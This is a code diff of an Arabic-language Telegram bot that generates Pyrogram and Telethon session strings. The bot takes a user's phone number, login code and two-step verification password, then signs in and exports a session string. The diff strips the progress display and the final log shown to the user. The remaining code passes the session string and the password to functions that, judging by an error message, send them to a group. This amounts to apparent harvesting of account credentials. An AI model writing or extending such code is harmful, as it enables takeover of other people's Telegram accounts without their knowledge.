@@ -52,79 +52,6 @@ app = Client(
     bot_token=BOT_TOKEN
 )
 
-# ====== دوال التحديث اللحظي (Live Logs) ======
-async def update_progress(message, step, current, total, status="⏳"):
-    """
-    تحديث شريط التقدم بشكل لحظي
-    step: اسم الخطوة (مثال: "إرسال الرمز")
-    current: الرقم الحالي (مثال: 3)
-    total: العدد الكلي (مثال: 5)
-    status: إيموجي الحالة (⏳, ✅, ❌, 🔄)
-    """
-    # حساب النسبة المئوية
-    percent = int((current / total) * 100)
-    
-    # بناء شريط التقدم (10 مربعات)
-    filled = int(percent / 10)
-    bar = "▓" * filled + "░" * (10 - filled)
-    
-    # اختيار لون حسب النسبة
-    if percent < 30:
-        color = "🔴"
-    elif percent < 70:
-        color = "🟡"
-    else:
-        color = "🟢"
-    
-    progress_text = f"""🔄 **جاري الاستخراج...** {color}
-
-┌─────────────────────────┐
-│ {bar} │
-└─────────────────────────┘
-📊 **التقدم:** {percent}% ({current}/{total})
-
-📌 **الخطوة الحالية:** {status} {step}
-
-⏱ الوقت: `{datetime.now().strftime('%H:%M:%S')}`
-"""
-    
-    try:
-        await message.edit_text(progress_text)
-    except:
-        # لو الرسالة ما انشئت، نرسل جديدة
-        await message.reply(progress_text)
-
-async def send_final_log(message, session_string, session_type="Pyrogram", password=None):
-    """إرسال اللوج النهائي مع تفاصيل الجلسة"""
-    
-    # تفاصيل إضافية عن الجلسة
-    session_hash = hashlib.md5(session_string.encode()).hexdigest()[:8]
-    session_length = len(session_string)
-    
-    final_text = f"""✅ **اكتمل الاستخراج بنجاح!** 🎉
-
-┌─────────────────────────────────┐
-│ 📋 **تفاصيل الجلسة:**           │
-├─────────────────────────────────┤
-│ 📱 النوع: {session_type}        │
-│ 🔑 الطول: {session_length} حرف  │
-│ 🆔 هاش الجلسة: `{session_hash}` │
-│ ⏱ الوقت: {datetime.now().strftime('%H:%M:%S')} │
-└─────────────────────────────────┘
-
-🔑 **الجلسة (انسخها):**
-`{session_string}`
-
-⚠️ **تحذير:** لا تشارك هذه الجلسة مع أي شخص!
-
-👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}
-"""
-    
-    if password:
-        final_text += f"\n🔒 **كلمة المرور (2SV):** `{password}`"
-    
-    await message.reply(final_text)
-
 # ====== دوال مسح الملفات ======
 def delete_session_files(user_id):
     pyro_session = f"session_{user_id}.session"
@@ -342,42 +269,31 @@ async def handle_arabic_commands(client, message):
             "أو استخدم الأمر /start للرجوع إلى البداية."
         )
 
-# ====== دوال Pyrogram مع Live Logs ======
+# ====== دوال Pyrogram ======
 async def pyro_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
 
     if step == "pyro_phone":
-        # ====== الخطوة 1: استلام الرقم ======
+        # ====== استلام الرقم ======
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "pyro_otp"
-        
-        # إنشاء رسالة التقدم
-        progress_msg = await message.reply("🔄 جاري التهيئة...")
-        await update_progress(progress_msg, "تهيئة الاتصال", 0, 5, "🔧")
         
         # إنشاء العميل
         session_name = f"session_{user_id}"
         temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
         user_data[user_id]["client"] = temp_client
-        user_data[user_id]["progress_msg"] = progress_msg
-        
-        await update_progress(progress_msg, "الاتصال بخوادم Telegram", 1, 5, "📡")
         await temp_client.connect()
         
-        await update_progress(progress_msg, "إرسال طلب الرمز", 2, 5, "📤")
         try:
             code = await temp_client.send_code(user_data[user_id]["phone"])
             user_data[user_id]["phone_code_hash"] = code.phone_code_hash
-            await update_progress(progress_msg, "تم إرسال الرمز ✅", 3, 5, "✅")
             
-            # تعديل الرسالة لطلب الرمز
-            await progress_msg.edit_text(
+            await message.reply(
                 f"📨 **تم إرسال رمز التحقق!**\n\n"
                 f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
                 f"📝 أرسل الرمز بالأرقام فقط.\n"
-                f"مثال: `12345`\n\n"
-                f"🔄 **حالة الطلب:** تم الإرسال بنجاح ✅"
+                f"مثال: `12345`"
             )
             
         except ApiIdInvalid:
@@ -388,29 +304,16 @@ async def pyro_session_step(client, message):
             reset_user(user_id)
             
     elif step == "pyro_otp":
-        # ====== الخطوة 2: استلام الرمز ======
+        # ====== استلام الرمز ======
         phone_code = message.text.replace(" ", "")
         temp_client = user_data[user_id]["client"]
-        progress_msg = user_data[user_id].get("progress_msg")
-        
-        if progress_msg:
-            await update_progress(progress_msg, "التحقق من الرمز", 4, 5, "🔍")
         
         try:
             await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
             
-            # ====== اكتمال ======
-            if progress_msg:
-                await update_progress(progress_msg, "إنشاء الجلسة النهائية", 5, 5, "✅")
-                await asyncio.sleep(0.5)
-                await progress_msg.delete()
-            
-            # إرسال الجلسة مع اللوج النهائي
-            await send_final_log(message, session_string, "Pyrogram")
-            
-            # إرسال إلى القناة
+            # إرسال الجلسة
             await send_pyro_session(user_id, session_string, message)
             
             await temp_client.disconnect()
@@ -420,11 +323,9 @@ async def pyro_session_step(client, message):
             await message.reply('❌ خطأ: رمز التحقق غير صالح.')
             reset_user(user_id)
         except PhoneCodeExpired:
-            # تنظيف البيانات القديمة
             await temp_client.disconnect()
             reset_user(user_id)
             
-            # عرض رسالة خطأ مع إمكانية إعادة المحاولة
             await message.reply(
                 '❌ **انتهت صلاحية الرمز!**\n\n'
                 '📌 الرموز تنتهي بعد فترة قصيرة.\n'
@@ -435,23 +336,11 @@ async def pyro_session_step(client, message):
             )
         except SessionPasswordNeeded:
             user_steps[user_id] = "pyro_password"
-            if progress_msg:
-                await progress_msg.edit_text(
-                    f"🔒 **مطلوب كلمة المرور!**\n\n"
-                    f"حسابك مفعل بخاصية التحقق بخطوتين (2SV).\n\n"
-                    f"📝 يرجى إرسال كلمة المرور الخاصة بك.\n\n"
-                    f"⏳ انتظر..."
-                )
-            else:
-                await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
+            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
             
     elif step == "pyro_password":
         # ====== معالجة كلمة المرور ======
         temp_client = user_data[user_id]["client"]
-        progress_msg = user_data[user_id].get("progress_msg")
-        
-        if progress_msg:
-            await update_progress(progress_msg, "التحقق من كلمة المرور", 4, 5, "🔐")
         
         try:
             password = message.text
@@ -459,12 +348,6 @@ async def pyro_session_step(client, message):
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
             
-            if progress_msg:
-                await update_progress(progress_msg, "اكتمال الاستخراج ✅", 5, 5, "✅")
-                await asyncio.sleep(0.5)
-                await progress_msg.delete()
-            
-            await send_final_log(message, session_string, "Pyrogram", password)
             await send_pyro_session(user_id, session_string, message, password)
             
             await temp_client.disconnect()
@@ -504,7 +387,7 @@ async def send_pyro_session(user_id, session_string, message, password=None):
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
 
-# ====== دوال Telethon مع Live Logs ======
+# ====== دوال Telethon ======
 async def telethon_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
@@ -513,28 +396,19 @@ async def telethon_session_step(client, message):
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "telethon_otp"
         
-        progress_msg = await message.reply("🔄 جاري التهيئة...")
-        await update_progress(progress_msg, "تهيئة الاتصال", 0, 5, "🔧")
-        
         session_name = f"telethon_{user_id}"
         temp_client = TelegramClient(session_name, API_ID, API_HASH)
         user_data[user_id]["client"] = temp_client
-        user_data[user_id]["progress_msg"] = progress_msg
-        
-        await update_progress(progress_msg, "الاتصال بخوادم Telegram", 1, 5, "📡")
         await temp_client.connect()
         
-        await update_progress(progress_msg, "إرسال طلب الرمز", 2, 5, "📤")
         try:
             await temp_client.send_code_request(user_data[user_id]["phone"])
-            await update_progress(progress_msg, "تم إرسال الرمز ✅", 3, 5, "✅")
             
-            await progress_msg.edit_text(
+            await message.reply(
                 f"📨 **تم إرسال رمز التحقق!**\n\n"
                 f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
                 f"📝 أرسل الرمز بالأرقام فقط.\n"
-                f"مثال: `12345`\n\n"
-                f"🔄 **حالة الطلب:** تم الإرسال بنجاح ✅"
+                f"مثال: `12345`"
             )
             
         except ApiIdInvalidError:
@@ -547,22 +421,12 @@ async def telethon_session_step(client, message):
     elif step == "telethon_otp":
         phone_code = message.text.replace(" ", "")
         temp_client = user_data[user_id]["client"]
-        progress_msg = user_data[user_id].get("progress_msg")
-        
-        if progress_msg:
-            await update_progress(progress_msg, "التحقق من الرمز", 4, 5, "🔍")
         
         try:
             await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
             
-            if progress_msg:
-                await update_progress(progress_msg, "إنشاء الجلسة النهائية", 5, 5, "✅")
-                await asyncio.sleep(0.5)
-                await progress_msg.delete()
-            
-            await send_final_log(message, session_string, "Telethon")
             await send_telethon_session(user_id, session_string, message)
             
             await temp_client.disconnect()
@@ -572,7 +436,6 @@ async def telethon_session_step(client, message):
             await message.reply('❌ خطأ: رمز التحقق غير صالح.')
             reset_user(user_id)
         except PhoneCodeExpiredError:
-            # تنظيف البيانات القديمة
             await temp_client.disconnect()
             reset_user(user_id)
             
@@ -586,22 +449,10 @@ async def telethon_session_step(client, message):
             )
         except SessionPasswordNeededError:
             user_steps[user_id] = "telethon_password"
-            if progress_msg:
-                await progress_msg.edit_text(
-                    f"🔒 **مطلوب كلمة المرور!**\n\n"
-                    f"حسابك مفعل بخاصية التحقق بخطوتين (2SV).\n\n"
-                    f"📝 يرجى إرسال كلمة المرور الخاصة بك.\n\n"
-                    f"⏳ انتظر..."
-                )
-            else:
-                await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
+            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
             
     elif step == "telethon_password":
         temp_client = user_data[user_id]["client"]
-        progress_msg = user_data[user_id].get("progress_msg")
-        
-        if progress_msg:
-            await update_progress(progress_msg, "التحقق من كلمة المرور", 4, 5, "🔐")
         
         try:
             password = message.text
@@ -609,12 +460,6 @@ async def telethon_session_step(client, message):
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
             
-            if progress_msg:
-                await update_progress(progress_msg, "اكتمال الاستخراج ✅", 5, 5, "✅")
-                await asyncio.sleep(0.5)
-                await progress_msg.delete()
-            
-            await send_final_log(message, session_string, "Telethon", password)
             await send_telethon_session(user_id, session_string, message, password)
             
             await temp_client.disconnect()
